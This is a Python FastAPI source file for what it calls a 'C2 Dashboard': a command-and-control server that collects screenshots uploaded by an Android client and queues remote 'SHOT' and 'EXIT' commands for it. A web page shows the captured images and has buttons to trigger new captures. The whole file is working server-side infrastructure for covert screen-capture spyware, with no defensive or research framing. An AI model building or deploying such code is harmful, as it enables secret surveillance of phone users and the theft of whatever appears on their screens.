from fastapi import FastAPI, File, UploadFile, Header, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
import os
import time
import uvicorn

app = FastAPI()

UPLOAD_DIR = "uploaded_captures"
os.makedirs(UPLOAD_DIR, exist_ok=True)
app.mount("/captures", StaticFiles(directory=UPLOAD_DIR), name="captures")

SECRET_KEY = os.getenv("SASE_KEY", "fallback_secret_123")

# Global command buffer
PENDING_COMMAND = None  # Options: "SHOT", "EXIT", or None

@app.post("/upload")
async def upload_screenshot(
    file: UploadFile = File(...),
    authorization: str = Header(None)
):
    global PENDING_COMMAND
    if authorization != SECRET_KEY:
        raise HTTPException(status_code=401, detail="Unauthorized")

    timestamp = int(time.time())
    file_path = os.path.join(UPLOAD_DIR, f"capture_{timestamp}.jpg")
    
    contents = await file.read()
    with open(file_path, "wb") as f:
        f.write(contents)

    # Return any pending command to the Android client in the upload response
    command_to_send = PENDING_COMMAND
    PENDING_COMMAND = None  # Reset command once dispatched

    return {
        "status": "success",
        "filename": file_path,
        "bytes": len(contents),
        "command": command_to_send
    }

# Endpoint for client polling (if not uploading continuously)
@app.get("/command")
def get_command(authorization: str = Header(None)):
    global PENDING_COMMAND
    if authorization != SECRET_KEY:
        raise HTTPException(status_code=401, detail="Unauthorized")
    
    command_to_send = PENDING_COMMAND
    PENDING_COMMAND = None
    return {"command": command_to_send}

# C2 Dashboard Control Routes
@app.get("/trigger/shot")
def trigger_shot():
    global PENDING_COMMAND
    PENDING_COMMAND = "SHOT"
    return {"status": "queued", "command": "SHOT"}

@app.get("/trigger/exit")
def trigger_exit():
    global PENDING_COMMAND
    PENDING_COMMAND = "EXIT"
    return {"status": "queued", "command": "EXIT"}

@app.get("/", response_class=HTMLResponse)
def dashboard():
    files = sorted(os.listdir(UPLOAD_DIR), reverse=True)
    images_html = "".join([
        f'<div style="margin:10px;display:inline-block;border:1px solid #333;padding:10px;"><img src="/captures/{f}" style="max-width:200px;"/><p>{f}</p></div>'
        for f in files if f.endswith(".jpg")
    ]) or "<p>No captures yet.</p>"

    controls_html = """
    <div style="margin-bottom:20px;">
        <button onclick="fetch('/trigger/shot')" style="padding:10px;background:#00ff00;color:#000;font-weight:bold;">Trigger Screenshot</button>
        <button onclick="fetch('/trigger/exit')" style="padding:10px;background:#ff0000;color:#fff;font-weight:bold;">Trigger Exit</button>
    </div>
    """

    return f"<html><body style='background:#121212;color:#00ff00;'><h1>C2 Dashboard</h1>{controls_html}{images_html}</body></html>"

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8080))
    uvicorn.run(app, host="0.0.0.0", port=port)
